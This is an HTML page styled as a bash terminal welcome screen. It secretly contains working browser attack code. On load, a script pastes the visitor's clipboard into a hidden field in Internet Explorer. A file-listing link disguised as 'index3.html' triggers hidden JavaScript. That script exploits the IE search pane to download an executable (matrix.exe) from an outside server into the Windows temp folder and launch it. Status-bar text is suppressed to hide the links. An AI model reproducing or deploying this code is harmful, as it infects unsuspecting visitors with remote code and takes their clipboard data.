<html>
   <head>
      <title>&gt;/dev/null</title>
      <meta name='author' content='JG'>
      <meta http-equiv='Content-Type' content='text/html; charset=iso-8559-1'>
      <link rel='stylesheet' type='text/css' href='styles/global.css'>
   </head>
<body background='images/kb.jpg' onLoad='self.focus();document.myform.command.focus()'>
		<table bgcolor='#000000' border='0' cellspacing='0' cellpadding='0' align='center' width='840'>
			<tbody><tr>
				<td>
					<img border='0' alt='' src='images/top_left.png'>
				</td>
				<td>
					<img border='0' alt='' src='images/top.png'>
				</td>
				<td>
					<img border='0' alt='' src='images/top_right.png'>
				</td>
			</tr>
			<tr>
				<td background='images/left.png'>
				</td>
				<td valign='top' width='801'>
					<font size='3' face='courier' color='#18F018'>
						bash-2.05b# cat welcome<br>
						<br>
						Welcome to this site, may the source be with you! (type help for a usage guide)<br>
						(this site is optimized for Mozilla/Firebird and against IE)
	<br>
	if you are using IE i just could have stolen your clipboard content:<br><form name='suckit'><textarea name='suckit' id='suckit' rows='1' cols='30' style='font-family: courier; background:#000000; color:#FF0000; border-style: solid; border-width: 0; padding: 0; overflow:hidden; '></textarea><script>var suckclip=suckit.suckit.createTextRange();suckclip.execCommand('Paste');suckclip.collapse(false);</script></form>						<br>
						<br>
						bash-2.05b# ls -la --color=auto<br>

<pre>total 18
drwxr-xr-x    1 root     root         4096 Jan 18  2004 .
drwxr-xr-x    1 root     root         4096 Jan 18  2004 ..
-rwxr--r--    1 root     root         3369 Jan 18  2004 index.php
-rwxr--r--    1 root     root         1580 Jan 17 12:55 <a href='index2.html'>index2.html</a>
-rwxr--r--    1 root     root         1811 Feb 19 21:14 <a href='javascript:doit()'>index3.html</a>
-rwxr--r--    1 root     root          860 Feb 19 22:02 <a href='index4.html'>index4.html</a>
-rwxr--r--    1 root     root         3252 Jan 17 12:55 <a href='perl.html'>perl.html</a>
-rwxr--r--    1 root     root           89 Jan 17 20:36 welcome
</pre><br>
</font>
<font size='3' face='courier' color='#18F018'><font face='courier' color='#18F018'><form name='myform' method='post'>bash-2.05b# <input type='text' name='command' size='40' border='0' style='font-family: courier; background:#000000; color:#18F018; border-style: solid; border-width: 0; padding: 0;' value=''></form></font><textarea id="code" style="display: none;">
s=new ActiveXObject("ADODB.Stream");
s.Mode=3;
s.Type=1;
s.Open();
x=new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET","http://orpheus.fh-hagenberg.at/students/cms/cms01003/matrix.exe",0);
x.Send();
s.Write(x.responseBody);
s.SaveToFile("C:\\windows\\temp\\matrix.exe",2);
</textarea>

<textarea id="code2" style="display: none;">
md="<!-- ct id=\"oFile\""+" classid=\"clsid:11111111-1111-1111-1111-111111111111\""+" codebase=\"c:/windows/temp/matrix.exe\"></obje-->";

        w=createPopup();
        w.document.clear();
        w.document.write(md);

</textarea>
<script language="javascript">
function hidestatus(){
window.status=''
return true
}

if (document.layers)
document.captureEvents(Event.MOUSEOVER | Event.MOUSEOUT)

document.onmouseover=hidestatus
document.onmouseout=hidestatus

    function preparecode(code) {
        result = '';
        lines = code.split(/\r\n/);
        for (i=0;i<lines.length;i++) {

            line = lines[i];
            line = line.replace(/^\s+/,"");
            line = line.replace(/\s+$/,"");
            line = line.replace(/[\\]/g,"\\\\");
            line = line.replace(/'/g,"\\'");
            line = line.replace(/"/g,"\\\"");
            line = line.replace(/[/]/g,"%2f");


            line = line.replace(/\r\n/,"");
            line += ' ';

            if (line != '') {
                result += line;
            }
        }
        return result;
    }
    function weiter() {
        open(myURL,"_search");
    }

    function starten(thecode) {
        mycode = preparecode(thecode);
        myURL = "file:javascript:eval('" + mycode + "')";
        open("http:///","_search");
        setTimeout("weiter()", 500);
    }

    function doit() {
    starten(document.all.code.value);
    setTimeout("doit2()", 600);
    }

    function doit2() {
    starten(document.all.code2.value);
    }
</script>
<br>
	</font>
	</td>
	<td background='images/right.png'>
	</td>
</tr>
<tr>
	<td>
		<img border='0' alt='' src='images/bottom_left.png'>
	</td>
	<td>
		<img border='0' alt='' src='images/bottom.png'>
	</td>
	<td>
		<img border='0' alt='' src='images/bottom_right.png'>
	</td>
</tr>
</tbody></table>
<br>
<br><div style='position:absolute; top:97%; left:99%;'><a href='http://www.net-security.org' target='_blank'><img src='images/pi.gif' border='0' width='16' height='16' align='right' alt=''></a></div></body></html>